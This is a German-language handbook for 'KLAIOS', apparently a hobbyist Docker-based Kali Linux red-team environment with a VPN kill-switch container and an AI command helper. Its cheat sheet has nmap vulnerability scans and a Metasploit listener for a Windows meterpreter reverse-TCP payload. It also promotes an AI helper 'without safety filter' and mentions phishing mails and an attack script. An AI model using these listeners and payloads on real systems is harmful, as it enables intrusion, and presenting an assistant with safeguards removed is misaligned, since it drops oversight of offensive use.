# 🛡️ KLAIOS – System-Handbuch (v6.0)

**Name:** KLAIOS (Kali Linux AI Operations System)
**Version:** 6.0 (Red Team Edition)
**Status:** Operational / Armed

---

## 1. Was ist KLAIOS?

KLAIOS ist eine hybride Sicherheits-Umgebung. Es kombiniert die offensive Stärke von **Kali Linux** mit der Sicherheit eines **VPN-Bunkers** und der Intelligenz moderner **KI**.
Es ist kein einfaches Tool, sondern ein "Labor im Container", das physikalisch vom Host-System getrennt ist, aber Zugriff auf lokale und externe Ziele hat.

### Die Architektur

* **Container 1 (VPN):** Der "Türsteher". Leitet den gesamten Verkehr durch einen verschlüsselten Tunnel (ProtonVPN). Besitzt einen "Kill-Switch" (Kabel raus, wenn VPN weg).
* **Container 2 (Core):** Die "Waffe". Enthält Nmap, Metasploit, Python und die KI-Skripte. Nutzt das Netz des VPN-Containers.

---

## 2. Aktuelle Funktionen (Core)

Das System wird lokal per Terminal bedient.

* VPN-Bunker (Kill-Switch, gesamter Traffic ueber VPN)
* Kali Toolset (nmap, metasploit, python)
* AI Helper fuer Befehle im Terminal

## 3. Bedienungsanleitung

### System Starten & Stoppen

Öffne PowerShell in deinem Projektordner:

1. **Starten:** `docker-compose up -d`
2. **Stoppen:** `docker-compose down`
3. **Status prüfen:** `docker-compose ps`

### Zugriff

Terminal im Container:
* `docker exec -it klaios-core bash`

Root-Terminal (optional):
* `docker exec -it -u root klaios-core bash`

### Workflow fuer einen Test (Beispiel)

1. Terminal im Container oeffnen.
2. VPN-Status pruefen: `curl ifconfig.me`.
3. Scan oder Tool im Terminal starten (z.B. `nmap`, `msfconsole`).

---

## 4. Befehls-Sammlung (Cheat Sheet)

Hier sind die wichtigsten Befehle für das Terminal im Container oder die PowerShell.

### 🛠️ Wartung & Reparatur (PowerShell)

Wenn etwas klemmt oder neue Tools fehlen:

```powershell
# Container komplett neu bauen (löscht keine Daten im Workspace)
docker-compose down
docker-compose build --no-cache
docker-compose up -d

# Falls Python-Fehler "externally managed" kommen (Live-Fix):
docker exec -it -u root klaios-core pip3 install <paketname> --break-system-packages

```

### 🤖 KI-Assistent (Terminal)

Der integrierte KI-Helper (ohne Sicherheitsfilter):

```bash
# Frage stellen
ai "Wie scanne ich nach EternalBlue Schwachstellen?"

# Code generieren lassen
ai "Schreibe ein Python Script für einen Portscanner"

```

### 📡 Manuelle Scans (Terminal)

Wenn du mehr Kontrolle brauchst:

```bash
# Wo bin ich? (IP Check)
curl ifconfig.me

# Schneller Scan des lokalen Netzes (z.B. Router)
nmap -F 192.168.2.1

# Aggressiver Scan gegen erlaubtes Ziel
sudo nmap -sV -O --script vuln scanme.nmap.org

```

### ⚔️ Metasploit / Payload (Terminal)

```bash
# Listener starten (Wartet auf eingehende Verbindung vom Virus)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

```

### 📂 Dateisystem

* **Workspace:** `/home/researcher/workspace`
* Hier landen Scan-Berichte und generierte Payloads (`.exe`).
* Dieser Ordner ist mit deinem Windows-Desktop synchronisiert!



---

## ⚠️ Wichtige Sicherheitshinweise

1. **Rechtliches:** Scanne NUR eigene Geräte oder Ziele mit ausdrücklicher Erlaubnis (`scanme.nmap.org`).
2. **OpSec:** Pruefe vor jedem Scan kurz mit `curl ifconfig.me`, ob die VPN-IP aktiv ist.
3. **Phishing:** Sende Phishing-Mails nur an deine eigenen Test-Accounts. Gmail sperrt Accounts, die echtes Spamming betreiben.   Und mit auto_hacker.py bzw das Script nur in  eigene netzwerke mit Erlaubnis benutzen.

